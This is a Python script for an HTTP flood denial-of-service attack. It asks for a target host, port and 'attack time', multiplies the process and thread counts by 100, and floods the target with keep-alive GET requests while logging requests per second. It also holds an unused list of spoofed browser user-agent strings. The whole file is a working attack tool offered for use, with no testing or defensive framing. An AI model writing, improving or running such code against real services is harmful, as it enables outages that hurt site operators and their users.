import threading
import requests
from multiprocessing import Process, Manager
import random
import time
import logging

# Set up logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to send requests
def send_requests(url, port, thread_count, attack_duration, metrics):
    session = requests.Session()
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
    }
    end_time = time.time() + attack_duration
    while time.time() < end_time:  # Loop to keep sending requests until time is up
        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=single_request, args=(session, url, port, headers, metrics))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
    metrics['finished'] = True

def single_request(session, url, port, headers, metrics):
    try:
        start_time = time.time()
        response = session.get(f"http://{url}:{port}", headers=headers)
        elapsed_time = time.time() - start_time
        data_size = len(response.content) / 1024  # Convert bytes to kilobytes
        with metrics['lock']:
            metrics['request_count'] += 1
            metrics['data_size_kb'] += data_size
        logging.debug(f"Response Code: {response.status_code} from {url}:{port}, Size: {data_size:.2f} KB, Time: {elapsed_time:.2f} s")
        time.sleep(random.uniform(0.01, 0.1))  # Reduced random delay to increase intensity
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to resolve domain: {e}")

def random_user_agent():
    user_agents = [
        		'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
		'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
		'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
		'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
		'Mozilla/5.0 (webOS/3.0; ARM; en-US) AppleWebKit/96.0 (KHTML, like Gecko) Epic Privacy Browser/96.0 Safari/96.0',
		'Mozilla/5.0 (BlackBerry/10.1; ARM; en-GB) AppleWebKit/95.0 (KHTML, like Gecko) Opera/95.0 Safari/95.0',
		'Mozilla/5.0 (Windows CE/5.0; ARM; de-DE) AppleWebKit/52.0 (KHTML, like Gecko) Epic Privacy Browser/52.0 Safari/52.0',
		'Mozilla/5.0 (Android/Android 11; ARM; en-US) AppleWebKit/87.0 (KHTML, like Gecko) GreenBrowser/87.0 Safari/87.0',
		'Mozilla/5.0 (Windows NT/5.0; Win32; en-US) AppleWebKit/66.0 (KHTML, like Gecko) SeaMonkey/66.0 Safari/66.0',
		'Mozilla/5.0 (Macintosh/Intel; x86; en-GB) AppleWebKit/97.0 (KHTML, like Gecko) Midori/97.0 Safari/97.0',
		'Mozilla/5.0 (webOS/1.0; ARM; de-DE) AppleWebKit/74.0 (KHTML, like Gecko) Opera/74.0 Safari/74.0',
		'Mozilla/5.0 (Symbian/Anna; ARM; fr-FR) AppleWebKit/91.0 (KHTML, like Gecko) 360 Secure Browser/91.0 Safari/91.0',
		'Mozilla/5.0 (Windows Phone/7.5; ARM; fr-FR) AppleWebKit/64.0 (KHTML, like Gecko) Midori/64.0 Safari/64.0',
		'Mozilla/5.0 (BlackBerry/10.2; x86; de-DE) AppleWebKit/79.0 (KHTML, like Gecko) Yandex Browser/79.0 Safari/79.0',
		'Mozilla/5.0 (Bada/1.2; ARM; fr-FR) AppleWebKit/94.0 (KHTML, like Gecko) Waterfox/94.0 Safari/94.0',
		'Mozilla/5.0 (Chrome OS/13421.63.0; x86_64; en-US) AppleWebKit/61.0 (KHTML, like Gecko) Internet Explorer/61.0 Safari/61.0',
		'Mozilla/5.0 (Windows NT/6.1; Win32; de-DE) AppleWebKit/51.0 (KHTML, like Gecko) Firefox/51.0 Safari/51.0',
		'Mozilla/5.0 (Windows NT/1.0; Win64; en-GB) AppleWebKit/79.0 (KHTML, like Gecko) Samsung Internet/79.0 Safari/79.0',
		'Mozilla/5.0 (Bada/1.2; ARM; de-DE) AppleWebKit/72.0 (KHTML, like Gecko) Waterfox/72.0 Safari/72.0',
		'Mozilla/5.0 (webOS/1.0; ARM; de-DE) AppleWebKit/67.0 (KHTML, like Gecko) Netscape/67.0 Safari/67.0',
		'Mozilla/5.0 (Tizen/3.0; ARM; en-GB) AppleWebKit/61.0 (KHTML, like Gecko) Slimjet/61.0 Safari/61.0',
		'Mozilla/5.0 (Windows NT/5.2; Win32; fr-FR) AppleWebKit/73.0 (KHTML, like Gecko) IceCat/73.0 Safari/73.0',
		'Mozilla/5.0 (Windows CE/5.0; x86; en-US) AppleWebKit/77.0 (KHTML, like Gecko) IceCat/77.0 Safari/77.0',
		'Mozilla/5.0 (Android/Android 6; x86; de-DE) AppleWebKit/94.0 (KHTML, like Gecko) Konqueror/94.0 Safari/94.0',
		'Mozilla/5.0 (Tizen/2.4; ARM; fr-FR) AppleWebKit/95.0 (KHTML, like Gecko) IceCat/95.0 Safari/95.0',
		'Mozilla/5.0 (Macintosh/Intel Mac OS X 10_11_6; x86; fr-FR) AppleWebKit/62.0 (KHTML, like Gecko) Pale Moon/62.0 Safari/62.0',
		'Mozilla/5.0 (Symbian/Belle; x86; de-DE) AppleWebKit/69.0 (KHTML, like Gecko) Konqueror/69.0 Safari/69.0',
		'Mozilla/5.0 (Chrome OS/13421.63.0; x86_64; fr-FR) AppleWebKit/84.0 (KHTML, like Gecko) Netscape/84.0 Safari/84.0',
		'Mozilla/5.0 (Windows CE/7.0; ARM; fr-FR) AppleWebKit/95.0 (KHTML, like Gecko) Torch Browser/95.0 Safari/95.0',
		'Mozilla/5.0 (Macintosh/Intel Mac OS X 10_15_7; x86_64; en-US) AppleWebKit/57.0 (KHTML, like Gecko) Qutebrowser/57.0 Safari/57.0',
		'Mozilla/5.0 (webOS/3.0; ARM; en-GB) AppleWebKit/74.0 (KHTML, like Gecko) Brave/74.0 Safari/74.0',
		'Mozilla/5.0 (Linux/x86_64; de-DE) AppleWebKit/73.0 (KHTML, like Gecko) Torch Browser/73.0 Safari/73.0',
		'Mozilla/5.0 (Android/Android 8; ARM64; en-US) AppleWebKit/74.0 (KHTML, like Gecko) Brave/74.0 Safari/74.0',
		'Mozilla/5.0 (Bada/2.0; ARM; de-DE) AppleWebKit/68.0 (KHTML, like Gecko) Yandex Browser/68.0 Safari/68.0',
		'Mozilla/5.0 (Android/Android 4; x86_64; fr-FR) AppleWebKit/84.0 (KHTML, like Gecko) UC Browser/84.0 Safari/84.0',
		'Mozilla/5.0 (Linux/x86_64; en-US) AppleWebKit/51.0 (KHTML, like Gecko) Slimjet/51.0 Safari/51.0',
		'Mozilla/5.0 (Linux/ARM; de-DE) AppleWebKit/75.0 (KHTML, like Gecko) Samsung Internet/75.0 Safari/75.0',
		'Mozilla/5.0 (Windows CE/7.0; ARM; en-US) AppleWebKit/56.0 (KHTML, like Gecko) Opera/56.0 Safari/56.0',
		'Mozilla/5.0 (Linux/x86_64; en-US) AppleWebKit/54.0 (KHTML, like Gecko) Waterfox/54.0 Safari/54.0',
		'Mozilla/5.0 (Linux/ARM64; fr-FR) AppleWebKit/73.0 (KHTML, like Gecko) 360 Secure Browser/73.0 Safari/73.0',
		'Mozilla/5.0 (Windows NT/2.11; Win32; fr-FR) AppleWebKit/81.0 (KHTML, like Gecko) Otter Browser/81.0 Safari/81.0',
		'Mozilla/5.0 (Android/Android 11; x86_64; fr-FR) AppleWebKit/75.0 (KHTML, like Gecko) SeaMonkey/75.0 Safari/75.0',
		'Mozilla/5.0 (Bada/1.0; ARM; en-GB) AppleWebKit/89.0 (KHTML, like Gecko) Waterfox/89.0 Safari/89.0',
		'Mozilla/5.0 (BlackBerry/6.0; ARM; fr-FR) AppleWebKit/84.0 (KHTML, like Gecko) Chrome/84.0 Safari/84.0',
		'Mozilla/5.0 (Windows NT/6.3; Win32; de-DE) AppleWebKit/91.0 (KHTML, like Gecko) Internet Explorer/91.0 Safari/91.0',
		'Mozilla/5.0 (Android/Android 5; x86_64; en-GB) AppleWebKit/53.0 (KHTML, like Gecko) Lunascape/53.0 Safari/53.0',
		'Mozilla/5.0 (Bada/1.0; ARM; fr-FR) AppleWebKit/78.0 (KHTML, like Gecko) Internet Explorer/78.0 Safari/78.0',
		'Mozilla/5.0 (Tizen/2.4; ARM; fr-FR) AppleWebKit/73.0 (KHTML, like Gecko) GreenBrowser/73.0 Safari/73.0',
		'Mozilla/5.0 (Tizen/2.4; ARM; en-US) AppleWebKit/66.0 (KHTML, like Gecko) GreenBrowser/66.0 Safari/66.0',
		'Mozilla/5.0 (Tizen/3.0; ARM; en-US) AppleWebKit/57.0 (KHTML, like Gecko) Chrome/57.0 Safari/57.0',
		'Mozilla/5.0 (Macintosh/Intel Mac OS X 10_11_6; x86_64; de-DE) AppleWebKit/83.0 (KHTML, like Gecko) Internet Explorer/83.0 Safari/83.0',
		'Mozilla/5.0 (Symbian/Anna; ARM; fr-FR) AppleWebKit/87.0 (KHTML, like Gecko) Opera/87.0 Safari/87.0',
		'Mozilla/5.0 (Chrome OS/13421.65.0; x86_64; en-GB) AppleWebKit/99.0 (KHTML, like Gecko) GreenBrowser/99.0 Safari/99.0',
		'Mozilla/5.0 (Windows NT/2.0; Win32; de-DE) AppleWebKit/56.0 (KHTML, like Gecko) Slimjet/56.0 Safari/56.0',
		'Mozilla/5.0 (Macintosh/Intel Mac OS X 10_11_6; x86_64; en-US) AppleWebKit/58.0 (KHTML, like Gecko) Maxthon/58.0 Safari/58.0',
		'Mozilla/5.0 (Bada/2.0; ARM; en-GB) AppleWebKit/81.0 (KHTML, like Gecko) Lunascape/81.0 Safari/81.0',
		'Mozilla/5.0 (BlackBerry/10.2; x86; en-US) AppleWebKit/81.0 (KHTML, like Gecko) Mozilla/81.0 Safari/81.0',
		'Mozilla/5.0 (BlackBerry/10.0; x86; fr-FR) AppleWebKit/91.0 (KHTML, like Gecko) Slimjet/91.0 Safari/91.0',
		'Mozilla/5.0 (Tizen/2.4; ARM; de-DE) AppleWebKit/94.0 (KHTML, like Gecko) Cent Browser/94.0 Safari/94.0',
		'Mozilla/5.0 (BlackBerry/10.0; ARM; de-DE) AppleWebKit/68.0 (KHTML, like Gecko) Yandex Browser/68.0 Safari/68.0',
		'Mozilla/5.0 (Windows NT/3.11; Win32; en-GB) AppleWebKit/90.0 (KHTML, like Gecko) UC Browser/90.0 Safari/90.0',
		'Mozilla/5.0 (Windows Phone/7.5; ARM; fr-FR) AppleWebKit/54.0 (KHTML, like Gecko) Cent Browser/54.0 Safari/54.0',
		'Mozilla/5.0 (Bada/1.2; ARM; en-US) AppleWebKit/99.0 (KHTML, like Gecko) SeaMonkey/99.0 Safari/99.0',
		'Mozilla/5.0 (Linux/x86_64; de-DE) AppleWebKit/94.0 (KHTML, like Gecko) Cent Browser/94.0 Safari/94.0',
		'Mozilla/5.0 (Tizen/3.0; ARM; de-DE) AppleWebKit/64.0 (KHTML, like Gecko) Waterfox/64.0 Safari/64.0',
		'Mozilla/5.0 (webOS/2.2; ARM; fr-FR) AppleWebKit/72.0 (KHTML, like Gecko) 360 Secure Browser/72.0 Safari/72.0',
		'Mozilla/5.0 (BlackBerry/10.2; x86; de-DE) AppleWebKit/56.0 (KHTML, like Gecko) Midori/56.0 Safari/56.0',
		'Mozilla/5.0 (Macintosh/Intel; x86; en-US) AppleWebKit/51.0 (KHTML, like Gecko) Qutebrowser/51.0 Safari/51.0',
		'Mozilla/5.0 (Linux/x86; en-US) AppleWebKit/98.0 (KHTML, like Gecko) IceCat/98.0 Safari/98.0',
		'Mozilla/5.0 (Bada/2.0; ARM; en-GB) AppleWebKit/88.0 (KHTML, like Gecko) Samsung Internet/88.0 Safari/88.0',
		'Mozilla/5.0 (Macintosh/68K; x86_64; de-DE) AppleWebKit/90.0 (KHTML, like Gecko) Opera/90.0 Safari/90.0',
		'Mozilla/5.0 (Tizen/2.3; ARM; de-DE) AppleWebKit/83.0 (KHTML, like Gecko) Vivaldi/83.0 Safari/83.0',
		'Mozilla/5.0 (webOS/1.0; ARM; de-DE) AppleWebKit/51.0 (KHTML, like Gecko) UC Browser/51.0 Safari/51.0',
		'Mozilla/5.0 (Linux/x86; fr-FR) AppleWebKit/66.0 (KHTML, like Gecko) Slimjet/66.0 Safari/66.0',
		'Mozilla/5.0 (BlackBerry/10.3; ARM; en-US) AppleWebKit/76.0 (KHTML, like Gecko) Mozilla/76.0 Safari/76.0',
		'Mozilla/5.0 (Windows NT/3.51; Win32; fr-FR) AppleWebKit/85.0 (KHTML, like Gecko) Pale Moon/85.0 Safari/85.0',
		'Mozilla/5.0 (Symbian/Anna; x86; fr-FR) AppleWebKit/90.0 (KHTML, like Gecko) GreenBrowser/90.0 Safari/90.0',
		'Mozilla/5.0 (webOS/3.0; ARM; en-GB) AppleWebKit/95.0 (KHTML, like Gecko) IceCat/95.0 Safari/95.0',
		'Mozilla/5.0 (Windows CE/6.0; ARM; fr-FR) AppleWebKit/58.0 (KHTML, like Gecko) Torch Browser/58.0 Safari/58.0',
		'Mozilla/5.0 (Android/Android 10; x86_64; fr-FR) AppleWebKit/96.0 (KHTML, like Gecko) Yandex Browser/96.0 Safari/96.0'
    ]
    return random.choice(user_agents)

# Function to start multiple processes
def start_processes(url, port, process_count, thread_count, attack_duration, metrics):
    processes = []
    for _ in range(process_count):
        p = Process(target=send_requests, args=(url, port, thread_count, attack_duration, metrics))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()

# Function to log RPS and data size
def log_metrics(metrics, attack_duration):
    start_time = time.time()
    while time.time() - start_time < attack_duration:
        time.sleep(1)
        with metrics['lock']:
            rps = metrics['request_count']
            data_size_kb = metrics['data_size_kb']
            metrics['request_count'] = 0
            metrics['data_size_kb'] = 0
        logging.info(f"RPS: {rps}, Data Size: {data_size_kb:.2f} KB")
    metrics['finished'] = True

# Main function
if __name__ == "__main__":
    url = input("Enter the URL/IP of the target: ")
    port = int(input("Enter the Port: "))
    process_count = int(input("Enter the Number Of processes: "))
    thread_count = int(input("Enter the Number Of threads per process: "))
    attack_duration = int(input("Enter attack time in seconds (max 10000 seconds): "))

    if attack_duration > 10000:
        print("Attack duration cannot exceed 10000 seconds.")
    else:
        manager = Manager()
        metrics = manager.dict()
        metrics['request_count'] = 0
        metrics['data_size_kb'] = 0
        metrics['lock'] = manager.Lock()
        metrics['finished'] = False
        
        logging.info(f"Starting attack on {url}:{port} with {process_count * 100} processes and {thread_count * 100} threads per process for {attack_duration} seconds.")
        
        metric_process = Process(target=log_metrics, args=(metrics, attack_duration))
        metric_process.start()
        
        start_processes(url, port, process_count * 100, thread_count * 100, attack_duration, metrics)
        
        metric_process.join()
        
        logging.info("Attack finished.")
